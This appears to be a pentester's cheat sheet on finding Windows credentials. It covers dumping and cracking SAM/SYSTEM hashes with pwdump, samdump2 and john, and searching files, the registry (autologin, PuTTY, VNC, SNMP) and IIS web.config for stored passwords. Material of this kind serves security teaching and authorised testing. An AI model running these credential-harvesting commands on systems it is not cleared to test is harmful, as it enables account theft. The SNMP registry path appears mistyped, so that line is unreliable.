# SAM and SYSTEM files
The **S**ecurity **A**ccount **M**anager (SAM) is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.

Common locations for the `SAM` and the `SYSTEM` files:
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
**NOTE:** `%SYSTEMROOT%` is by defaut `C:\Windows`.

## Generating a hash file
If we are able to copy the files to our local machine, we can generate a hash file with `pwdump` or `samdump2` for a specific user. 
With this file we could crack the hash locally.
```powershell
pwdump SYSTEM SAM > /root/sam.txt
# OR
samdump2 SYSTEM SAM -o sam.txt
```

With these files we could crack it with `john` for example.
```bash
john -format=NT /root/sam.txt
```


# Searching in file contents
Search in interessting files for potential passwords:
```powershell
findstr /SI /M "password" *.xml *.ini *.txt
# OR
findstr /si password *.xml *.ini *.txt *.config
# OR
findstr /spin "password" *.*
```


# Searching with filename patterns
```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
# OR
where /R C:\ user.txt
# OR
where /R C:\ *.ini
```


# Searching in the registry
There could be passwords in the registry.
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

REG QUERY HKLM /f password /t REG_SZ /s
REG QUERY HKCU /f password /t REG_SZ /s

# Windows Autologin
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 

# SNMP parameters
REG QUERY "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty clear text proxy credentials
REG QUERY "HKCU\Software\SimonTatham\PuTTY\Sessions" 

# VNC credentials
REG QUERY "HKCU\Software\ORL\WinVNC3\Password" 
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```


# IIS Web config
Get the web configuration file.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Common locations:
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
# OR
C:\inetpub\wwwroot\web.config
```